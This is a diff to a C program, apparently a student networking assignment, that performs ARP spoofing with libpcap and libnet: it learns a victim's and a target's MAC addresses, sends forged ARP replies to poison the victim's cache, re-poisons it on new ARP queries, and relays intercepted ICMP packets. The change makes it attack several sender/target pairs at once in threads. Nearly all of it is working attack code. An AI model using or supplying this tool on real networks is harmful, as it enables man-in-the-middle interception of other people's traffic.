@@ -1,13 +1,15 @@
+#include <stdio.h>
+#include <unistd.h>
 #include <libnet.h>
 #include <netinet/in.h>
 #include <libnet/libnet-types.h>
 #include <libnet/libnet-macros.h>
 #include <libnet/libnet-headers.h>
+#include <pthread.h>
 #include <pcap.h>
 #include <arpa/inet.h>
 #include <netinet/tcp.h>
 #include <stdint.h>
-#include <stdio.h>
 
 #define SIZE_ETHERNET 14
 
@@ -31,6 +33,14 @@ typedef struct arphdr
 	uint8_t target_mac[6];
 	uint8_t target_ip[4];
 }arphdr;
+
+typedef struct argu
+{
+	int num;
+	char* dev;
+	char* Send_ip;
+	char* Targ_ip;
+}argu;
 #pragma pack(pop)
 
 void usage()
@@ -66,7 +76,7 @@ void make_ether_pkt(ethhdr* eth_pkt, uint8_t* dhost, uint8_t* shost, arphdr arp_
 }
 
 
-int main(int argc, char* argv[])
+void* thread_spoof(void* data)
 {
 	int s, i;
 	struct ifreq ifrq;
@@ -75,24 +85,20 @@ int main(int argc, char* argv[])
 	uint8_t* t_mac = (uint8_t*)malloc(6 * sizeof(uint8_t));
 	uint8_t* s_mac = (uint8_t*)malloc(6 * sizeof(uint8_t));
 
-	if (argc != 4)
-	{
-		usage();
-		return -1;
-	}
+	struct argu* arg = (struct argu*)data;
 
 	s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
 	if (s < 0)
 	{
 		printf("socket error\n");
-		return -1;
+		return (void*)-1;
 	}
 
-	strcpy(ifrq.ifr_name, argv[1]);
+	strcpy(ifrq.ifr_name, arg->dev);
 	if (ioctl(s, SIOCGIFHWADDR, &ifrq) < 0)      //MAC 주소를 가져와서 ifrq에 저장
 	{
 		printf("MAC error\n");
-		return -1;
+		return (void*)-1;
 	}
 
 	//my MAC address
@@ -109,7 +115,7 @@ int main(int argc, char* argv[])
 	if (ioctl(s, SIOCGIFADDR, &ifrq) < 0)          //IP 주소를 가져와서 ifrq에 저장
 	{
 		printf("IP error\n");
-		return -1;
+		return (void*)-1;
 	}
 
 	//my IP address
@@ -124,7 +130,7 @@ int main(int argc, char* argv[])
 	memset(s_mac, NULL, 6 * sizeof(uint8_t));
 	make_arp_pkt(&s_arphdr, mymac, s_mac, 1);
 	inet_pton(AF_INET, ipbuf, &s_arphdr.sender_ip);
-	inet_pton(AF_INET, argv[2], &s_arphdr.target_ip);
+	inet_pton(AF_INET, arg->Send_ip, &s_arphdr.target_ip);
 
 	//make ethernet packet(attacker to sender)
 	struct ethhdr s_ethpkt;
@@ -136,19 +142,19 @@ int main(int argc, char* argv[])
 	memcpy(s_packet, &s_ethpkt, size * sizeof(uint8_t));
 
 	//send packet   
-	char* dev = argv[1];
+	char* dev = arg->dev;
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
 	if (handle == NULL)
 	{
 		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
-		return -1;
+		return (void*)-1;
 	}
 
 	if (pcap_sendpacket(handle, s_packet, size))
 	{
 		printf("Failed send packet\n");
-		return -1;
+		return (void*)-1;
 	}
 
 
@@ -162,9 +168,9 @@ int main(int argc, char* argv[])
 		int res = pcap_next_ex(handle, &header, &r_packet);
 		if (res == 0) continue;
 		if (res == -1 || res == -2) break;
-
+		
 		r_ethhdr = (struct ethhdr*)(r_packet);
-		if (r_ethhdr != NULL && ntohs(r_ethhdr->ether_type) == 0x0806)
+		if (r_ethhdr != NULL && ntohs(r_ethhdr->ether_type) == 0x0806 && !memcmp(r_ethhdr->ether_dhost, mymac, 6*sizeof(uint8_t)))
 		{
 			memcpy(s_mac, r_ethhdr->ether_shost, 6 * sizeof(uint8_t));   //sender mac 저장
 			printf("get sender MAC : ");
@@ -184,8 +190,8 @@ int main(int argc, char* argv[])
 
 	//make fake arp packet
 	make_arp_pkt(&fake_arphdr, mymac, s_mac, 2);      //fake arp reply
-	inet_pton(AF_INET, argv[3], &fake_arphdr.sender_ip);   //with my ip
-	inet_pton(AF_INET, argv[2], &fake_arphdr.target_ip);   //with sender's ip							   
+	inet_pton(AF_INET, arg->Targ_ip, &fake_arphdr.sender_ip);
+	inet_pton(AF_INET, arg->Send_ip, &fake_arphdr.target_ip);							   
 	//make fake ethernet packet
 	struct ethhdr fake_ethpkt;
 	make_ether_pkt(&fake_ethpkt, s_mac, mymac, fake_arphdr);
@@ -195,15 +201,16 @@ int main(int argc, char* argv[])
 	if (pcap_sendpacket(handle, fake_packet, size))
 	{
 		printf("Failed send fake arp packet\n");
-		return -1;
+		return (void*)-1;
 	}
 	printf("spoofed sender!\n");
+
 
 	//make arp packet2(attacker to target)
 	memset(t_mac, NULL, 6 * sizeof(uint8_t));
 	make_arp_pkt(&s_arphdr, mymac, t_mac, 1);
 	inet_pton(AF_INET, ipbuf, &s_arphdr.sender_ip);
-	inet_pton(AF_INET, argv[3], &s_arphdr.target_ip);
+	inet_pton(AF_INET, (const char*)arg->Targ_ip, &s_arphdr.target_ip);
 
 	//make ethernet packet2(attacker to target)
 	memset(t_mac, 255, 6 * sizeof(uint8_t));
@@ -215,7 +222,7 @@ int main(int argc, char* argv[])
 	if (pcap_sendpacket(handle, s_packet, size))
 	{
 		printf("Failed send packet\n");
-		return -1;
+		return (void*)-1;
 	}
 
 	//receive and parse packet -> get target's mac
@@ -230,7 +237,7 @@ int main(int argc, char* argv[])
 		if (res == -1 || res == -2) break;
 
 		r_ethhdr = (struct ethhdr*)(r_packet);
-		if (r_ethhdr != NULL && ntohs(r_ethhdr->ether_type) == 0x0806)
+		if (r_ethhdr != NULL && ntohs(r_ethhdr->ether_type) == 0x0806 && !memcmp(r_ethhdr->ether_dhost, mymac, 6*sizeof(uint8_t)) && memcmp(r_ethhdr->ether_shost, s_mac, 6*sizeof(uint8_t)))
 		{
 			memcpy(t_mac, r_ethhdr->ether_shost, 6 * sizeof(uint8_t));        //target mac 저장
 			printf("get target MAC : ");
@@ -247,27 +254,8 @@ int main(int argc, char* argv[])
 			continue;
 	}
 
-	//make fake arp packet
-        make_arp_pkt(&fake_arphdr2, mymac, t_mac, 2);      //fake arp reply
-        inet_pton(AF_INET, argv[2], &fake_arphdr2.sender_ip);
-        inet_pton(AF_INET, argv[3], &fake_arphdr2.target_ip);
-
-        //make fake ethernet packet
-        struct ethhdr fake_ethpkt2;
-        make_ether_pkt(&fake_ethpkt2, t_mac, mymac, fake_arphdr2);
-        uint8_t* fake_packet2 = (uint8_t*)malloc(size * sizeof(uint8_t));
-        memcpy(fake_packet2, &fake_ethpkt2, size * sizeof(uint8_t));
-
-        if (pcap_sendpacket(handle, fake_packet2, size))
-        {       
-                printf("Failed send fake arp packet\n");
-                return -1;
-        }
-        printf("spoofed target!\n");
-
 	//waiting for packet(ex: ping)....
 	sleep(1);
-
 
 	while (1)
 	{
@@ -289,36 +277,21 @@ int main(int argc, char* argv[])
 		{
 			struct libnet_ipv4_hdr* r_ip_hdr;
 			r_ip_hdr = (struct libnet_ipv4_hdr*)(r_packet + 14);
-			char temp_ip[32];
-			inet_ntop(AF_INET, &r_ip_hdr->ip_src, temp_ip, sizeof(temp_ip));
 			if (r_ip_hdr != NULL && r_ip_hdr->ip_p == 0x01)
 			{
-				if(!memcmp(&temp_ip, argv[2], sizeof(argv[2])))
+				if(!memcmp(r_ethhdr->ether_shost,s_mac,sizeof(s_mac)))
 				{
 					printf("get icmp packet from sender!\n");
 					//change mac
 					memcpy(r_ethhdr->ether_shost, mymac, 6 * sizeof(uint8_t));
 					memcpy(r_ethhdr->ether_dhost, t_mac, 6 * sizeof(uint8_t));
-					inet_pton(AF_INET, (char*)&ipbuf, &r_ip_hdr->ip_src);
 					if (pcap_sendpacket(handle, (const uint8_t*)r_packet, 74))
 					{
 						printf("Failed send icmp packet\n");
-						return -1;
+						return (void*)-1;
 					}
 					printf("ICMP packet sending to target is completed!\n");
 				}
-				else if(!memcmp(&temp_ip, argv[3], sizeof(argv[3])))
-				{
-                                        printf("get icmp packet from target!\n");
-                                        //change mac
-                                        memcpy(r_ethhdr->ether_shost, mymac, 6 * sizeof(uint8_t));
-                                        memcpy(r_ethhdr->ether_dhost, s_mac, 6 * sizeof(uint8_t));
-                                        if (pcap_sendpacket(handle, (const uint8_t*)r_packet, 74))
-                                        {
-                                                printf("Failed send icmp packet\n");
-                                                return -1;
-                                        }
-                                }
 			}
 			else
 				continue;
@@ -328,35 +301,54 @@ int main(int argc, char* argv[])
 		else if (r_ethhdr != NULL && ntohs(r_ethhdr->ether_type) == 0x0806)
 		{
 			//arp request(broadcast) from sender
-			if (!memcmp(r_ethhdr->ether_shost, s_mac, 6 * sizeof(uint8_t)))
+			if (!memcmp(r_ethhdr->ether_shost, s_mac, 6 * sizeof(uint8_t)) && r_packet[21] == 2)
 			{
 				printf("get arp packet from sender\n");
 				//send fake arp reply to sender
 				if (pcap_sendpacket(handle, fake_packet, size))
 				{
 					printf("Failed send fake arp packet\n");
-					return -1;
+					return (void*)-1;
 				}
 			}
-			//arp request(broadcast) from target
-			else if (!memcmp(r_ethhdr->ether_shost, t_mac, 6 * sizeof(uint8_t)))
-                        {
-                                printf("get arp packet! from target\n");
-                                //send fake arp reply to target
-                                if (pcap_sendpacket(handle, fake_packet2, size))
-                                {
-                                        printf("Failed send fake arp packet\n");
-                                        return -1;
-                                }
-                        }
-			else
-				continue;
 		}
 		else
 			continue;
 	}
+}
 
 
-
-
+int main(int argc, char*argv[])
+{
+	int i, status;
+	struct argu arg[10];
+	pthread_t thread[10];
+	
+	if (argc < 4 || argc%2 == 1)
+        {
+                usage();
+                return -1;
+        }
+	printf("argc: %d\n",argc);
+	
+	for(i=0;i<(argc-2)/2;i++)
+	{
+		arg[i].num = i;
+		arg[i].dev = argv[1];
+		arg[i].Send_ip = argv[i*2+2];
+		arg[i].Targ_ip = argv[i*2+3];
+	
+		if(pthread_create(&thread[i], NULL, &thread_spoof, (void*)&arg[i]))
+		{
+			printf("Fail to create thread\n");
+			return -1;
+		}
+	}
+	
+	for(i=0;i<(argc-2)/2;i++)
+	{
+		pthread_join(thread[i], (void**)&status);
+	}
+	
+	return 0;
 }
